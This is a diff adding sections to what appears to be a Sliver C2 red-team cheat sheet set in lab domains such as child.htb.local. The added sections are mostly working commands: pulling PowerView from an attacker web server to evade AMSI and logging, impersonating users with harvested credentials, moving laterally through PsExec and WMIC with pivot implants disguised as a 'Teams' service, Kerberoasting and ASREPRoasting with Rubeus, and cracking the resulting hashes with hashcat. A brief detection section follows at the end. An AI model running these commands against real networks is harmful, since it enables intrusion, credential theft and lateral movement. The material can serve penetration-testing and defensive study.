@@ -417,6 +417,131 @@ sliver (system_beacon) > ps -e lsass
 sliver (system_beacon) > procdump --pid &lt;lsass_pid&gt; --save /tmp/lsass.dmp
 # Parse offline: pypykatz lsa minidump /tmp/lsass.dmp</code></pre>
 
+  <h2>Domain Reconnaissance via sharpsh + PowerView</h2>
+  <p><code>sharpsh</code> uses the RunSpaceFactory namespace to execute PowerShell modules downloaded from a web server, bypassing PowerShell logging and AMSI. Combined with <code>PowerView</code>, this enables full AD enumeration without touching disk. Commands must be Base64-encoded first.</p>
+  <pre><code># Step 1: Encode the PowerView command on your attacker box
+echo -n "get-netuser | select samaccountname,description" | base64
+# Z2V0LW5ldHVzZXIgfCBzZWxlY3QgIHNhbWFjY291bnRuYW1lLGRlc2NyaXB0aW9u
+
+# Step 2: Host PowerView.ps1 on attacker web server
+python3 -m http.server 8081
+
+# Step 3: Run via sharpsh — fetches PowerView over HTTP, executes encoded command in-memory
+sliver (http-beacon) &gt; sharpsh -- '-u http://10.10.14.62:8081/PowerView.ps1 -e -c Z2V0LW5ldHVzZXIgfCBzZWxlY3QgIHNhbWFjY291bnRuYW1lLGRlc2NyaXB0aW9u'
+
+# Common PowerView commands to encode:
+# get-netuser | select samaccountname,description
+# Get-NetUser -PreauthNotRequired | select samaccountname       (AS-REP roastable users)
+# Get-NetUser -spn | select samaccountname,description          (Kerberoastable users)
+# Get-NetGroup -GroupName "Domain Admins" -Recurse              (group members)
+# Get-NetComputer | select dnshostname,operatingsystem          (hosts in domain)
+
+# SharpView via execute-assembly (AMSI+ETW bypass, 254 char limit on args):
+sliver (http-beacon) &gt; execute-assembly /home/user/SharpView.exe "get-netuser -PreauthNotRequired" -t 240 -i -E -M
+
+# Domain structure enumeration via c2tc-domaininfo (Armory BOF — no binary needed):
+sliver (http-beacon) &gt; c2tc-domaininfo
+
+# Network adapter enumeration (identify dual-homed hosts, pivot points):
+sliver (http-beacon) &gt; ifconfig
+
+# ADCS certificate template enumeration (look for ESC misconfigurations):
+sliver (http-beacon) &gt; certify -- find
+
+# PowerShell built-in (spawns visible window — bad OPSEC):
+sliver (http-beacon) &gt; execute -o powershell "$Forest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest(); $Forest.Domains"</code></pre>
+
+  <h2>Impersonation — make-token</h2>
+  <p><code>make-token</code> creates a new logon session using harvested credentials and impersonates the resulting token. Unlike <code>runas</code>, it doesn't spawn a new process — the current beacon adopts the new token, giving access to network resources as that user.</p>
+  <pre><code># Syntax:
+sliver (http-beacon) &gt; make-token -u USERNAME -d DOMAIN -p PASSWORD
+
+# Example — impersonate svc_sql in child.htb.local:
+sliver (http-beacon) &gt; make-token -u svc_sql -d child.htb.local -p jkhnrjk123!
+# [*] Successfully impersonated child.htb.local\svc_sql. Use `rev2self` to revert.
+
+# Verify access to target share after impersonation:
+sliver (http-beacon) &gt; ls //srv01.child.htb.local/c$
+
+# Revert to original token:
+sliver (http-beacon) &gt; rev2self</code></pre>
+
+  <table>
+    <thead><tr><th>Logon Type</th><th>Description</th></tr></thead>
+    <tbody>
+      <tr><td>LOGON_INTERACTIVE</td><td>Console or RDP logon; creates full interactive session</td></tr>
+      <tr><td>LOGON_NETWORK</td><td>High-performance; accepts password, NT hash, or Kerberos ticket</td></tr>
+      <tr><td>LOGON_BATCH</td><td>Scheduled task / startup context</td></tr>
+      <tr><td>LOGON_SERVICE</td><td>Account must have service privileges</td></tr>
+      <tr><td>LOGON_NETWORK_CLEARTEXT</td><td>Cleartext credential logon</td></tr>
+      <tr><td>LOGON_NEW_CREDENTIALS</td><td><strong>Default</strong> — clones current token, uses new credentials for outbound connections only</td></tr>
+    </tbody>
+  </table>
+
+  <pre><code># Specify logon type explicitly:
+sliver (http-beacon) &gt; make-token -u alice -d corp.local -p Password123 --logon-type LOGON_NETWORK</code></pre>
+
+  <h2>Lateral Movement — PsExec via TCP Pivot</h2>
+  <p>PsExec uploads a service binary to the target and creates a Windows service to execute it. When the internal target can't reach the C2 server directly, a TCP pivot listener on the compromise host chains the traffic. The service binary must be in <code>service</code> format.</p>
+  <pre><code># Step 1: Impersonate a user with local admin on the target
+sliver (http-beacon) &gt; make-token -u svc_sql -d child.htb.local -p jkhnrjk123!
+
+# Step 2: Start TCP pivot listener on the compromise host (internal IP)
+# The internal target will connect back through this pivot to reach the C2
+sliver (http-beacon) &gt; pivots tcp --bind 172.16.1.11
+# [*] Started tcp pivot listener 172.16.1.11:9898 with id 1
+
+# Step 3: Generate a service-format implant that connects via the pivot
+sliver (http-beacon) &gt; generate --format service -i 172.16.1.11:9898 --skip-symbols -N psexec-pivot
+
+# Step 4: PsExec to the target — uploads and runs the service binary
+sliver (http-beacon) &gt; psexec --custom-exe /home/user/psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams srv01.child.htb.local
+# [*] Session 23471b15 psexec-pivot - ... (srv01) NT AUTHORITY\SYSTEM
+
+# WMIC lateral movement alternative (upload binary, then trigger via WMI):
+sliver (http-beacon) &gt; generate -i 172.16.1.11:9898 --skip-symbols -N wmicpivot
+sliver (http-beacon) &gt; make-token -u svc_sql -d child.htb.local -p jkhnrjk123!
+sliver (http-beacon) &gt; upload wmicpivot.exe //srv02.child.htb.local/c$/windows/tasks/wmicpivot.exe
+sliver (http-beacon) &gt; rev2self
+sliver (http-beacon) &gt; execute -o wmic /node:172.16.1.13 /user:svc_sql /password:jkhnrjk123! process call create "C:\\windows\\tasks\\wmicpivot.exe"
+
+# DCOM via Impacket (through SOCKS5 proxy established with socks5 start -P 1080):
+# proxychains impacket-dcomexec -object MMC20 child/svc_sql:'jkhnrjk123!'@172.16.1.13
+
+# List active pivots and sessions:
+sliver (http-beacon) &gt; pivots
+sliver (http-beacon) &gt; sessions</code></pre>
+
+  <h2>Kerberoasting via inline-execute-assembly</h2>
+  <p><code>inline-execute-assembly</code> executes .NET assemblies as a BOF (Beacon Object File) — no child process is spawned. Combined with the AMSI/ETW bypasses in Sliver, Rubeus can be run entirely in-memory. First enumerate SPNs to identify kerberoastable accounts.</p>
+  <pre><code># Step 1: Enumerate Kerberoastable users with PowerView via sharpsh
+echo -n "Get-NetUser -spn | select samaccountname,description" | base64
+# Outputs: R2V0LU5ldFVzZXIgLXNwbiB8IHNlbGVjdCBzYW1hY2NvdW50bmFtZSxkZXNjcmlwdGlvbgo=
+
+sliver (http-beacon) &gt; sharpsh -- '-u http://10.10.14.62:8080/PowerView.ps1 -e -c "R2V0LU5ldFVzZXIgLXNwbiB8IHNlbGVjdCBzYW1hY2NvdW50bmFtZSxkZXNjcmlwdGlvbgo="'
+
+# Alternative: delegationbof from Armory (6 = SPN check)
+sliver (http-beacon) &gt; delegationbof 6 child.htb.local
+
+# Step 2: Kerberoast target user with Rubeus via inline-execute-assembly
+sliver (http-beacon) &gt; inline-execute-assembly /home/user/Rubeus.exe 'kerberoast /format:hashcat /user:alice /nowrap'
+# Output: $krb5tgs$23$*alice$child.htb.local$...
+
+# ASREPRoast (users without Kerberos pre-authentication):
+sliver (http-beacon) &gt; inline-execute-assembly /home/user/Rubeus.exe 'asreproast /format:hashcat /user:bob /nowrap'
+# Output: $krb5asrep$23$bob@child.htb.local:...
+
+# Crack offline:
+hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt  # Kerberoast
+hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt  # ASREPRoast
+
+# BOF alternatives from Armory:
+sliver (http-beacon) &gt; c2tc-kerberoast roast alice     # returns ticket (convert with TicketToHashcat.py)
+sliver (http-beacon) &gt; bof-roast rdp/web01.child.htb.local  # SPN-based (convert with apreq2hashcat.py)
+
+# Setspn.exe — enumerate SPNs natively (bad OPSEC — spawns cmd):
+sliver (http-beacon) &gt; execute -o setspn.exe -Q */*</code></pre>
+
   <h2>Detection of Sliver — Blue Team Perspective</h2>
   <p>Sliver has well-known detection artifacts documented by Microsoft and community researchers. Key detection points: hardcoded PowerShell arguments in the shell command, getsystem injection patterns, and psexec service naming.</p>
   <pre><code>># --- Sigma Rule: shell command detection ---
